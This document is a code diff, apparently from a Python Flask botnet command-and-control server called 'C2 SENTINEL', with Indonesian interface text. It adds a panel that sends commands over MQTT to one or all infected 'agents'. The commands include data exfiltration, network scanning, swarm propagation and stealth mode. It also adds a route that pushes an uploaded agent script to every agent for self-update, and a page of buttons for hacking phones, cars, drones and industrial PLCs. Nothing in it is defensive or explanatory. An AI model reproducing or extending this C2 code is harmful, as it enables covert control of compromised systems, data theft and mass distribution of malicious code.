         agents_html += f'''
-        <div style="border: 1px solid rgba(0,255,0,0.2); margin: 15px 0; padding: 15px; border-radius: 8px; background: rgba(0,25,0,0.5);">
+        <div style="border: 1px solid var(--border-paper); margin: 15px 0; padding: 15px; background: rgba(255,255,255,0.8);">
             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                 <div>
                     <b style="font-size: 1.1em;">{agent_id}</b> 
                     <span class="status-{status}">● {status.upper()}</span>
                     {sev_tag}
                 </div>
-                <div>
-                    <a href="/command?agent_id={agent_id}"><button>Perintah</button></a>
+                <div style="color: var(--text-secondary); font-size: 0.9em;">
+                    {time_str}
                 </div>
             </div>
-            <div style="margin-top: 8px; font-size: 0.9em;">
-                <small>Terakhir: {time_str} | IP: {AGENT_SWARM_MAP.get(agent_id, {{}}).get("ip", "unknown")}</small>
+            <div style="margin-top: 10px;">
+                <a href="/command?agent={agent_id}"><button style="margin-right: 10px;">🎯 Command</button></a>
+                <a href="/reports?agent={agent_id}"><button>📄 Reports</button></a>
             </div>
         </div>
         '''
 
     content = f'''
-    <h2>👾 AGENT LIVE STATUS — GENERASI & METODE INFEKSI</h2>
-    <div style="background: rgba(0, 30, 0, 0.7); padding:20px; border-radius:10px; border: 1px solid #00ff00;">
-        {agents_html if agents_html else "<i style='color: #666;'>Tidak ada agent terdaftar.</i>"}
+    <h2>👾 AGENT LIVE MONITOR — REAL-TIME STATUS & CONTROL</h2>
+    <div class="card">
+        <p><strong>🟢 Total Agent Terdaftar:</strong> {len(AGENT_LAST_SEEN)}</p>
+        <p><strong>📡 Online (5 menit terakhir):</strong> {sum(1 for s in AGENT_STATUS.values() if s == "online")}</p>
+        <p><strong>💤 Offline:</strong> {sum(1 for s in AGENT_STATUS.values() if s == "offline")}</p>
     </div>
-    <p><small>Real-time via MQTT + WebSocket</small></p>
+
+    <div class="card">
+        <h3>📋 Daftar Agent ({len(AGENT_LAST_SEEN)} Agent)</h3>
+        {agents_html if agents_html else "<p style='color: var(--alert-maroon);'>Belum ada agent terdaftar.</p>"}
+    </div>
+
+    <script>
+        setInterval(() => {{
+            fetch('/agents').then(r => r.text()).then(html => {{
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                const newContent = doc.querySelector('.container').innerHTML;
+                document.querySelector('.container').innerHTML = newContent;
+            }});
+        }}, 5000);
+    </script>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
 
 @app.route('/command', methods=['GET', 'POST'])
-def command_panel():
+def command_center():
     if request.method == 'POST':
-        agent_id = request.form.get('agent_id')
-        cmd = request.form.get('cmd')
-        note = request.form.get('note', '')
-        if agent_id and cmd:
-            ACTIVE_COMMANDS[agent_id] = {
-                "cmd": cmd,
-                "note": note,
-                "timestamp": datetime.now().isoformat(),
-                "issued_by": "admin"
-            }
-            socketio.emit('command_issued', {"agent_id": agent_id, "cmd": cmd})
+        agent_id = request.form.get('agent_id', '').strip()
+        cmd = request.form.get('command', '').strip()
+        note = request.form.get('note', '').strip()
+        data_json = request.form.get('data', '{}')
+
+        if not agent_id or not cmd:
+            return jsonify({"error": "Agent ID dan command wajib diisi"}), 400
+
+        try:
+            data = json.loads(data_json)
+        except:
+            data = {}
+
+        command_data = {
+            "cmd": cmd,
+            "note": note,
+            "data": data,
+            "timestamp": datetime.now().isoformat(),
+            "issued_by": "manual"
+        }
+
+        if agent_id.lower() == "all":
+            # Kirim ke semua agent
+            count = 0
+            for aid in AGENT_LAST_SEEN.keys():
+                ACTIVE_COMMANDS[aid] = command_data.copy()
+                if MQTT_CLIENT and MQTT_CLIENT.is_connected():
+                    topic = f"c2/agent/{aid}/cmd"
+                    payload = json.dumps(ACTIVE_COMMANDS[aid])
+                    MQTT_CLIENT.publish(topic, payload, qos=1)
+                count += 1
+            result = f"Command berhasil dikirim ke {count} agent"
+        else:
+            ACTIVE_COMMANDS[agent_id] = command_data
+
             if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                 topic = f"c2/agent/{agent_id}/cmd"
-                payload = json.dumps(ACTIVE_COMMANDS[agent_id])
+                payload = json.dumps(command_data)
                 MQTT_CLIENT.publish(topic, payload, qos=1)
                 print(f"[MQTT] → {topic}: {payload}")
-            return f'''
-            <script>
-                alert("✅ Perintah '{cmd}' terkirim ke {agent_id}!");
-                window.location.href="/command";
-            </script>
-            '''
+                result = "Command berhasil dikirim via MQTT"
+            else:
+                result = "Command disimpan — tunggu agent check-in (MQTT tidak tersedia)"
 
-    prefill_id = request.args.get('agent_id', '')
-    commands_html = ""
-    for aid, cmd in list(ACTIVE_COMMANDS.items()):
-        try:
-            issued = datetime.fromisoformat(cmd["timestamp"]).strftime("%H:%M:%S")
-            expire_in = int(COMMAND_EXPIRY - (datetime.now() - datetime.fromisoformat(cmd["timestamp"])).total_seconds())
-            if expire_in < 0:
-                continue
-            status = "⏳" if expire_in > 60 else "⚠️"
-            commands_html += f"<li><b>{aid}</b>: <code>{cmd['cmd']}</code> {status} <small>({expire_in}s)</small><br><i>{cmd.get('note','')}</i></li>"
-        except:
-            pass
+        return jsonify({"success": True, "message": result})
+
+    agent_id = request.args.get('agent', '').strip()
+    agent_options = "".join([f'<option value="{aid}">{aid} ({AGENT_STATUS.get(aid, "unknown")})</option>' for aid in AGENT_LAST_SEEN.keys()])
 
     content = f'''
-    <h2>🎯 COMMAND CENTER — NEURAL SWARM CONTROL</h2>
-    <form method="post">
-        <label>🆔 Agent ID:</label><br>
-        <input type="text" name="agent_id" value="{prefill_id}" required><br><br>
-        
-        <label>🕹️ Perintah:</label><br>
-        <select name="cmd">
-            <option value="idle">🔄 idle - Mode standby</option>
-            <option value="scan">🔍 scan - Deep network scan</option>
-            <option value="exfil">📤 exfil - Data exfiltration</option>
-            <option value="update">🆙 update - Self-update agent</option>
-            <option value="kill">💀 kill - Self-destruct</option>
-            <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
-            <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
-            <option value="silent_mode">👻 silent_mode - Stealth operation</option>
-            <option value="set_generation">🧬 set_generation - Set swarm generation</option>
-        </select><br><br>
-        
-        <label>📝 Catatan (Opsional):</label><br>
-        <input type="text" name="note" placeholder="Contoh: fokus ke subnet 192.168.2.0"><br><br>
-        
-        <button type="submit">🚀 KIRIM PERINTAH — NEURAL CONFIRMED</button>
-    </form>
-    
-    <h3>📌 PERINTAH AKTIF (Auto-expire dalam 5 menit)</h3>
-    <ul style="font-family: 'Courier New'; font-size: 0.95em;">{commands_html if commands_html else "<i>Tidak ada perintah aktif.</i>"}</ul>
+    <h2>🎯 COMMAND CENTER — KIRIM PERINTAH KE AGENT</h2>
+    <div class="card">
+        <form method="POST">
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px;">Pilih Agent:</label>
+                <select name="agent_id" required>
+                    <option value="">-- Pilih Agent --</option>
+                    <option value="all">[ALL AGENTS]</option>
+                    {agent_options}
+                </select>
+            </div>
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px;">Command:</label>
+                <select name="command" required>
+                    <option value="idle">🔄 idle - Mode standby</option>
+                    <option value="scan">🔍 scan - Deep network scan</option>
+                    <option value="exfil">📤 exfil - Data exfiltration</option>
+                    <option value="update">🆙 update - Self-update agent</option>
+                    <option value="kill">💀 kill - Self-destruct</option>
+                    <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
+                    <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
+                    <option value="silent_mode">👻 silent_mode - Stealth operation</option>
+                    <option value="set_generation">🧬 set_generation - Set swarm generation</option>
+                    <!-- ✅ BARU: Hardware Commands -->
+                    <option value="mobile_control">📱 mobile_control - Hack smartphone</option>
+                    <option value="car_hack">🚗 car_hack - Hack car</option>
+                    <option value="arduino_control">🤖 arduino_control - Hack Arduino/ESP32</option>
+                    <option value="drone_hijack">🛸 drone_hijack - Hijack drone</option>
+                    <option value="plc_hack">🏭 plc_hack - Hack industrial PLC</option>
+                    <option value="planetary_takeover">🌍 planetary_takeover - Launch apocalypse</option>
+                </select>
+            </div>
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px;">Data (JSON - opsional):</label>
+                <textarea name="data" rows="4" placeholder='{{"target_ip": "192.168.1.100", "device_type": "Android"}}' style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">{{}}</textarea>
+            </div>
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px;">Catatan (Opsional):</label>
+                <input type="text" name="note" placeholder="Contoh: target CEO's iPhone" style="width: 100%; padding: 10px; border: 1px solid var(--border-paper); background: rgba(255,255,255,0.9);">
+            </div>
+            <button type="submit" style="background: var(--alert-maroon); color: white; border: 2px solid var(--alert-maroon);">🚀 KIRIM PERINTAH — OMNIVERSE CONFIRMED</button>
+        </form>
+    </div>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
 
@@ -1109,9 +1184,13 @@ def list_reports():
                 gen = r.get("data", {}).get("generation", 0)
                 method = r.get("data", {}).get("method", "")
                 gen_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{method}</span>'
+            # ✅ BARU: Hardware tag
+            elif r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
+                hw_type = r.get("type", "").replace("_", " ").title()
+                gen_tag = f'<span class="tag tag-hardware">{hw_type}</span>'
 
             formatted_reports.append(f'''
-<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#ff3366' if is_high_severity(r) else '#00ff00'}; background: rgba(0,20,0,0.5);">
+<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#8b0000' if is_high_severity(r) else '#b8860b'}; background: rgba(255,255,255,0.8);">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
         <div><b>Agent:</b> {r.get("id", "unknown")}</div>
         <div><span class="tag {sev_class}">{severity}</span> {gen_tag}</div>
@@ -1123,10 +1202,10 @@ def list_reports():
             ''')
 
         content = f'''
-        <h2>📁 LAPORAN AGENT — NEURAL ARCHIVE</h2>
+        <h2>📁 LAPORAN AGENT — OMNIVERSE ARCHIVE</h2>
         {export_links}
         <div class="terminal" id="reportTerminal">
-            {"".join(formatted_reports) if formatted_reports else "<i style='color: #666;'>Belum ada laporan.</i>"}
+            {"".join(formatted_reports) if formatted_reports else "<i style='color: var(--text-secondary);'>Belum ada laporan.</i>"}
         </div>
         {export_links}
         '''
@@ -1173,13 +1252,13 @@ def live_logs():
             issue = r.get("issue", "N/A")
             rtype = r.get("type", "beacon")
             severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
-            sev_color = "#ff3366" if is_high_severity(r) else "#00ff00"
+            sev_color = "#8b0000" if is_high_severity(r) else "#b8860b"
             logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | Type: {rtype} | {issue}')
 
         content = f'''
-        <h2>📜 LIVE LOGS — NEURAL FEED</h2>
+        <h2>📜 LIVE LOGS — OMNIVERSE FEED</h2>
         <div class="terminal" id="logTerminal">
-            <div id="logContent" style="color:#00ff00; font-family: 'Courier New';">
+            <div id="logContent" style="color:#b8860b; font-family: 'Courier New';">
                 {"".join(f"<div>{log}</div>" for log in logs) if logs else "<i>Belum ada log.</i>"}
             </div>
         </div>
@@ -1260,13 +1339,113 @@ def beacon():
         print(f"[BEACON ERROR] {e}")
         return "Error", 500
 
-@app.route('/update', methods=['GET'])
+# ✅ BARU: ROUTE UNTUK UPLOAD UPGRADE SCRIPT
+@app.route('/upload_upgrade', methods=['GET', 'POST'])
+def upload_upgrade():
+    if request.method == 'POST':
+        if 'file' in request.files:
+            file = request.files['file']
+            if file.filename.endswith('.py'):
+                global AGENT_UPGRADE_SCRIPT
+                AGENT_UPGRADE_SCRIPT = file.read().decode('utf-8')
+                # Kirim ke semua agent aktif
+                count = 0
+                for agent_id in list(AGENT_LAST_SEEN.keys()):
+                    if agent_id not in ACTIVE_COMMANDS:
+                        ACTIVE_COMMANDS[agent_id] = {
+                            "cmd": "update",
+                            "note": "AUTO: Mass upgrade initiated from C2",
+                            "timestamp": datetime.now().isoformat(),
+                            "issued_by": "c2_admin"
+                        }
+                        if MQTT_CLIENT and MQTT_CLIENT.is_connected():
+                            topic = f"c2/agent/{agent_id}/cmd"
+                            payload = json.dumps(ACTIVE_COMMANDS[agent_id])
+                            MQTT_CLIENT.publish(topic, payload, qos=1)
+                        count += 1
+                return jsonify({"success": True, "message": f"Upgrade script uploaded and broadcasted to {count} agents"})
+        return jsonify({"error": "Invalid file - must be .py"}), 400
+    
+    content = '''
+    <h2>📤 UPLOAD UPGRADE SCRIPT — UPDATE SEMUA AGENT</h2>
+    <div class="card">
+        <form method="POST" enctype="multipart/form-data">
+            <label>Upload agent.py baru:</label><br>
+            <input type="file" name="file" accept=".py" required><br><br>
+            <button type="submit" style="background: var(--accent-gold); color: white; border: 2px solid var(--accent-gold);">🚀 DEPLOY KE SEMUA AGENT — MASS UPGRADE</button>
+        </form>
+        <p><small>File akan dikirim ke semua agent aktif. Agent akan self-update otomatis.</small></p>
+    </div>
+    '''
+    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
+
+# ✅ BARU: ROUTE UNTUK HARDWARE CONTROL
+@app.route('/hardware')
+def hardware_control():
+    content = '''
+    <h2>🚗 HARDWARE APOCALYPSE CONTROL CENTER</h2>
+    <div class="card">
+        <h3>📱 Mobile Devices</h3>
+        <button onclick="sendCommand('mobile_control', '192.168.1.100', 'Android')" style="margin: 5px;">Hack Android</button>
+        <button onclick="sendCommand('mobile_control', '192.168.1.101', 'iOS')" style="margin: 5px;">Hack iPhone</button>
+    </div>
+    
+    <div class="card">
+        <h3>🚗 Cars</h3>
+        <button onclick="sendCommand('car_hack', '192.168.0.10', 'Toyota')" style="margin: 5px;">Hack Toyota</button>
+        <button onclick="sendCommand('car_hack', '192.168.0.11', 'Tesla')" style="margin: 5px;">Hack Tesla</button>
+    </div>
+    
+    <div class="card">
+        <h3>🛸 Drones</h3>
+        <button onclick="sendCommand('drone_hijack', '192.168.1.101', 'DJI Mavic')" style="margin: 5px;">Hijack DJI</button>
+    </div>
+    
+    <div class="card">
+        <h3>🤖 Arduino/PLC</h3>
+        <button onclick="sendCommand('arduino_control', '192.168.1.50', 'ESP32')" style="margin: 5px;">Hack ESP32</button>
+        <button onclick="sendCommand('plc_hack', '192.168.2.50', 'Siemens S7')" style="margin: 5px;">Hack Factory</button>
+    </div>
+
+    <script>
+    function sendCommand(cmd, target_ip, device_type) {
+        const data = JSON.stringify({target_ip: target_ip, device_type: device_type});
+        fetch('/command', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `agent_id=all&command=${cmd}&note=Hardware+target&data=${encodeURIComponent(data)}`
+        })
+        .then(r => r.json())
+        .then(data => {
+            alert('Command sent to all agents!');
+        })
+        .catch(err => {
+            alert('Error sending command');
+        });
+    }
+    </script>
+    '''
+    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
+
+@app.route('/update')
 def update():
-    update_file = "agent_new.py"
-    if not os.path.exists(update_file):
-        with open(update_file, "w") as f:
-            f.write('''print("✅ Agent updated to v9.0 - HIVE.MQ SWARM EDITION!")\n''')
-    return send_file(update_file)
+    if AGENT_UPGRADE_SCRIPT:
+        return AGENT_UPGRADE_SCRIPT, 200, {
+            'Content-Type': 'text/plain',
+            'Content-Disposition': 'attachment; filename=agent.py'
+        }
+    else:
+        # Fallback ke versi default
+        default_script = '''
+print("✅ Agent updated to latest version")
+import time
+time.sleep(2)
+print("🔄 Restarting...")
+'''
+        return default_script, 200, {
+            'Content-Type': 'text/plain',
+            'Content-Disposition': 'attachment; filename=agent.py'
+        }
 
 @app.route('/analytics')
 def analytics():
@@ -1304,11 +1483,11 @@ def analytics():
 
     <div class="ai-insight">
         <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
-        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
-        <p style="color: #ffff00; font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
+        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
+        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
     </div>
 
-    <div class="grid">
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
         <div class="card">
             <h3>📊 Top 10 Issue Types</h3>
             <div class="chart-container">
@@ -1348,20 +1527,20 @@ def analytics():
                 plugins: {{
                     legend: {{ display: false }},
                     tooltip: {{
-                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
-                        titleColor: '#00ff00',
-                        bodyColor: '#ffffff'
+                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
+                        titleColor: '#3b2f2f',
+                        bodyColor: '#000000'
                     }}
                 }},
                 scales: {{
                     x: {{ 
-                        ticks: {{ color: '#00ff00' }},
-                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
+                        ticks: {{ color: '#3b2f2f' }},
+                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                     }},
                     y: {{ 
                         beginAtZero: true, 
-                        ticks: {{ color: '#00ff00' }},
-                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
+                        ticks: {{ color: '#3b2f2f' }},
+                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                     }}
                 }},
                 animation: {{
@@ -1379,18 +1558,18 @@ def analytics():
                 datasets: [{{
                      {json.dumps(target_data)},
                     backgroundColor: [
-                        'rgba(0, 255, 0, 0.8)',
-                        'rgba(0, 200, 50, 0.8)',
-                        'rgba(0, 150, 100, 0.8)',
-                        'rgba(0, 100, 150, 0.8)',
-                        'rgba(0, 50, 200, 0.8)',
-                        'rgba(50, 0, 200, 0.8)',
-                        'rgba(100, 0, 150, 0.8)',
-                        'rgba(150, 0, 100, 0.8)',
-                        'rgba(200, 0, 50, 0.8)',
-                        'rgba(255, 0, 0, 0.8)'
+                        'rgba(184, 134, 11, 0.8)',
+                        'rgba(139, 69, 19, 0.8)',
+                        'rgba(139, 0, 0, 0.8)',
+                        'rgba(85, 107, 47, 0.8)',
+                        'rgba(75, 0, 130, 0.8)',
+                        'rgba(47, 79, 79, 0.8)',
+                        'rgba(105, 105, 105, 0.8)',
+                        'rgba(128, 0, 0, 0.8)',
+                        'rgba(139, 0, 139, 0.8)',
+                        'rgba(255, 140, 0, 0.8)'
                     ],
-                    borderColor: '#000000',
+                    borderColor: '#3b2f2f',
                     borderWidth: 1
                 }}]
             }},
@@ -1399,14 +1578,14 @@ def analytics():
                 plugins: {{
                     legend: {{ 
                         labels: {{ 
-                            color: '#00ff00',
+                            color: '#3b2f2f',
                             font: {{ size: 12 }}
                         }}
                     }},
                     tooltip: {{
-                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
-                        titleColor: '#00ff00',
-                        bodyColor: '#ffffff'
+                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
+                        titleColor: '#3b2f2f',
+                        bodyColor: '#000000'
                     }}
                 }},
                 animation: {{
@@ -1425,10 +1604,10 @@ def analytics():
                 datasets: [{{
                     label: 'Agent Online',
                      {json.dumps(chart_data)},
-                    borderColor: '#00ff00',
-                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
+                    borderColor: '#b8860b',
+                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
                     tension: 0.3,
-                    pointBackgroundColor: '#ff00ff',
+                    pointBackgroundColor: '#8b0000',
                     pointBorderColor: '#ffffff',
                     pointRadius: 4,
                     fill: true
@@ -1439,25 +1618,25 @@ def analytics():
                 plugins: {{
                     legend: {{ 
                         labels: {{ 
-                            color: '#00ff00',
+                            color: '#3b2f2f',
                             font: {{ size: 14 }}
                         }}
                     }},
                     tooltip: {{
-                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
-                        titleColor: '#00ff00',
-                        bodyColor: '#ffffff'
+                        backgroundColor: 'rgba(245, 240, 230, 0.9)',
+                        titleColor: '#3b2f2f',
+                        bodyColor: '#000000'
                     }}
                 }},
                 scales: {{
                     x: {{ 
-                        ticks: {{ color: '#00ff00' }},
-                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
+                        ticks: {{ color: '#3b2f2f' }},
+                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                     }},
                     y: {{ 
                         beginAtZero: true, 
-                        ticks: {{ color: '#00ff00' }},
-                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
+                        ticks: {{ color: '#3b2f2f' }},
+                        grid: {{ color: 'rgba(92, 74, 61, 0.1)' }}
                     }}
                 }},
                 animation: {{
@@ -1485,11 +1664,11 @@ def handle_disconnect():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8000))
     print("="*70)
-    print("🚀🚀🚀 C2 SENTINEL v9 — HIVE.MQ SWARM COMMAND CENTER")
+    print("🚀🚀🚀 C2 SENTINEL v14.0 — OMNIVERSE COMMAND CENTER")
     print(f"🌐 Running on http://0.0.0.0:{port}")
     print(f"🔐 XOR Key: '{XOR_KEY}'")
     print(f"📡 MQTT Broker: {MQTT_HOST}:{MQTT_PORT}")
-    print("🤖 Neural AI + Auto Command + Swarm Map + 3D Vis + MQTT + WS — ALL ACTIVE")
+    print("🤖 Neural AI + Auto Command + Swarm Map + 3D Vis + Hardware Control + Mass Upgrade — ALL ACTIVE")
     print("="*70)
 
     threading.Thread(target=init_mqtt, daemon=True).start()
